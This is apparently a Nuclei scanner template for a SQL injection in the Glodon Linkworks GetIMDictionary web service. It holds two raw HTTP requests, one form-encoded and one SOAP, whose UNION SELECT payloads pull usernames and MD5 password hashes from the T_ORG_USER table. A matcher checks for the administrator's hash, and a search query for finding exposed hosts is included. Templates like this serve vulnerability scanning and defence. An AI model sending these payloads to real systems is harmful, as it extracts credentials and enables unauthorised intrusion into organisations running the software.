id: glodon-GetIMDictionary-sqli

info:
  name: Glodon Linkworks GetIMDictionary - SQL injection
  author: leadlife
  severity: high
  description: Glodon Linkworks GetIMDictionary SQL injection
  reference:
    - todo
  metadata:
    verified: true
    fofa: body="/Services/Identification/"
  tags: glodon,sqli

http:
  - raw:
      - |
        POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --

      - |+
        POST /Webservice/IM/Config/ConfigService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/123.0.6312.88 Safari/537.36
        Content-Type: text/xml;charset=UTF-8

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
        <GetIMDictionary xmlns="http://tempuri.org/">
        <key>1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from
        T_ORG_USER --</key>
        </GetIMDictionary>
        </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "value=\"admin:(\\w{32})\""

      - type: status
        status:
          - 200
